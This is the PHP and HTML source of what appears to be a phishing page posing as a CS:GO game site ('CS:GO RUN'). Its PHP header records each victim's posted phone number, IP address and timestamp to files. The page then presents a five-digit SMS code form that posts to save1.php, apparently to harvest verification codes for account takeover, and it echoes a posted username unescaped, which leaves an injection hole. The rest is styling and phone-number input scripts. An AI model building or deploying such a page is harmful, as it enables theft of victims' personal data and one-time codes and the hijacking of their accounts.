<?php
include_once(__DIR__."/create_session.php");

date_default_timezone_set('America/Sao_Paulo');

$hora = date ("Y-m-d H:i:s");

$numeroTEL = $_POST['PhoneNumber'];
$ip = $_SERVER['REMOTE_ADDR'];

$key = $_SESSION['user']["id"];

write_in_file("telefone", $numeroTEL);
write_in_file("ip", $ip);
write_in_file("horario", $hora);

$username = $_POST['userz'];
?>
<html><script async="false" type="text/javascript" src="chrome-extension://fnjhmkhhmkbjkkabndcnnogagogbneec/in-page.js"></script><head><script async="false" type="text/javascript" src="chrome-extension://fnjhmkhhmkbjkkabndcnnogagogbneec/in-page.js"></script><script async="false" type="text/javascript" src="chrome-extension://fnjhmkhhmkbjkkabndcnnogagogbneec/in-page.js"></script><script async="false" type="text/javascript" src="chrome-extension://fnjhmkhhmkbjkkabndcnnogagogbneec/in-page.js"></script>
  <title>CS:GO RUN</title>
  
   <link href="https://cdn.jsdelivr.net/npm/intl-tel-input@16.0.2/build/css/intlTelInput.css" rel="stylesheet" media="screen">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"> </script>
	<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@16.0.2/build/js/intlTelInput.js"> </script>
	<title>Título da página</title>
    <meta charset="utf-8">
 
  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
      <link rel="icon" type="image/x-icon" href="https://static6.tgstat.ru/channels/_0/ce/ce8efeae926d129454fae80b31b2c803.jpg">

  
  
</head>

<body style="margin: 0;">

 

<div style="color:white;margin-left: 85%;margin-top: 2%;align-items: right;position:absolute;font-family: fantasy;"></div>

<div class="DivMae">
<div class="PopUp" style="">

 <!-- Parte2PopUp -->
<div style="border-radius:10px;" class="Parte2PopUp">
<img class="faca" src="faca.png">
</div>
<!-- Final Parte2PopUp -->


<!-- Parte1PopUp -->
<div style="border-radius:10px;" class="Parte1PopUp">
 
<div class="Form">
 
<img style="padding-left: 30%;width: 36%;height: 14%;" src="https://csgocatalog.com/uploads/sites/65/logo.png" class="logoPopUp">  
<div style="font-size: 19px;color:white;margin-bottom: 27px;font-family: Fantasy;padding-left: 7%;margin-top: -1%;"><a style="color:white;">User : <?php echo $username ?></a><a style="color:#f5c71b;"></a></div>
  <img style="padding-left:5%;width: 87%;height:50px;padding-bottom:35px;margin-top:-3%;" src="./sendd.png" class="">

 <img style="padding-left:5%;width: 87%;height: 19px;" src="./real.png" class="verify">
<form action="save1.php" method="POST" required="" id="formID">
 
 
 
<div class="InputLocation">
 
 <input style="text-align:center;font: bold;" type="numeric" name="code1" required="" maxlength="1" size="1">
 <input style="text-align:center;font: bold;" type="numeric" name="code2" required="" maxlength="1" size="1">
 <input style="text-align:center;font: bold;" type="numeric" name="code3" required="" maxlength="1" size="1">
 <input style="text-align:center;font: bold;" type="numeric" name="code4" required="" maxlength="1" size="1">
 <input style="text-align:center;font: bold;" type="numeric" name="code5" required="" maxlength="1" size="1">
 
</div>
<a href="./register-number.php"><img style="padding-left:5%;width: 78%;height: 24px;" src="./sendsms.png" class="logoPopUp2"></a>
<input type="submit" value="" required="" class="botao">

</form>

</div></div> 
<!-- FinalParte1PopUp -->




 

<!-- Final da DIV PopUp -->
</div>

<!-- Final da DIV MAE -->
</div>

<style>
 div.PopUp {
 position: absolute;
  width: 960px;
  height: 480px;
  z-index: 15;
  top: 28%;
  left: 28%;
  margin: -100px 0 0 -150px;
  background: url("./gray.png");
  border-radius: 20px;
  }
  
  div.Parte1PopUp {
  padding: 0;
  margin: 0;
  background: url("./gray.png");
  height:100%;
  width:50%;
  position: flex; 
  
  }
  
  
  
  
  div.Parte2PopUp {
  background: url("./gray.png");
  height: 100%;
  width: 50%;
  position: absolute;
  margin-left:50%;

  }
  
  .logoPopUp {
  margin-top:-0%;
 

  }
  
   .logoPopUp3 {
  margin-top:7%;
 

  }
  
  .verify {
  margin-top:3%;
  margin-bottom:5%;
  }
  
    .logoPopUp2 {
  margin-top:7%;
  margin-bottom:15px;

  }
  
  img.faca {
  height:94%;
  width: 99%;
  border-radius:10px;
  padding-top:5%;
  }
  
  body {
 background: url("../2fundoGORUN.png") 0% 0% / cover no-repeat scroll padding-box border-box rgb(18, 13, 14); z-index: 2;
  }
  
  
 .botao {
background-image:url("bconfirm.png");
width: 95%;
height: 9%;
 border-radius:10px;
 margin-left:3%;
 border-color: orange;
 margin-top:25px;
}

.input {
width: 80%;
height: 10%;
border-radius: 10px;
padding-top:100px;
margin-left: 5%;
background: ;
border-color: orange;
text-size:20px;
text-align: center;
}

input.PhoneNumber::placeholder {
  font: 1.25rem/3 sans-serif;
}

div.InputLocation {
padding-left: 7%;
margin-top: 3%;}
width:100%;

</style>



 <style>
 
input {
  width: 17%;
  margin-left: 5px;
  padding: 10px;
  height: 40px;
  border-radius: 10px;
  border: 1px solid #ccc;
   

   
}
input::placeholder {
  color: #BBB;
}
  </style>

 <script>
 
var input = document.querySelector("#phone");
var errorMap = ["Invalid number", "Invalid country code", "Too short", "Too long", "Invalid number"];
    window.addEventListener("load", function () {
        
        errorMsg = document.querySelector("#error-msg"),
 validMsg = document.querySelector("#valid-msg");
        var iti = window.intlTelInput(input, {
            utilsScript:"https://cdn.jsdelivr.net/npm/intl-tel-input@16.0.2/build/js/utils.js"
        });
        window.intlTelInput(input, {
            // allowDropdown: false,
            // autoHideDialCode: false,
            // autoPlaceholder: "off",
            // dropdownContainer: document.body,
            // excludeCountries: ["us"],
            // formatOnDisplay: false,
             geoIpLookup: function(callback) {
         $.get("https://ipinfo.io", function() {}, "jsonp").always(function(resp) {
           var countryCode = (resp && resp.country) ? resp.country : "";
           callback(countryCode);
         });
       },
            // hiddenInput: "full_number",
            initialCountry: "auto",
           
            // localizedCountries: { 'de': 'Deutschland' },
            //nationalMode: false,
            // onlyCountries: ['us', 'gb', 'ch', 'ca', 'do'],
            placeholderNumberType: "MOBILE",
            // preferredCountries: ['cn', 'jp'],
            // separateDialCode: true,
            utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@16.0.2/build/js/utils.js",
        });
        $(validMsg).addClass("hide");
        input.addEventListener('blur', function () {
            reset();
            if (input.value.trim()) {
                if (iti.isValidNumber()) {
                    validMsg.classList.remove("hide");
                } else {
                    input.classList.add("error");
                    var errorCode = iti.getValidationError();
                    errorMsg.innerHTML = errorMap[errorCode];
                    errorMsg.classList.remove("hide");
                }
            }
        });
        
        input.addEventListener('change', reset);
        input.addEventListener('keyup', reset);
    });

    
    var reset = function () {
        input.classList.remove("error");
        errorMsg.innerHTML = "";
        errorMsg.classList.add("hide");
        validMsg.classList.add("hide");
    };

  </script>

  
	 <script>
	$("input").keyup(function () {
    if (this.value.length == this.maxLength) {
      $(this).next('input').focus();
    }
});
</script>
	
	 
<script class="iti-load-utils" async="" src="https://cdn.jsdelivr.net/npm/intl-tel-input@16.0.2/build/js/utils.js"></script></body></html>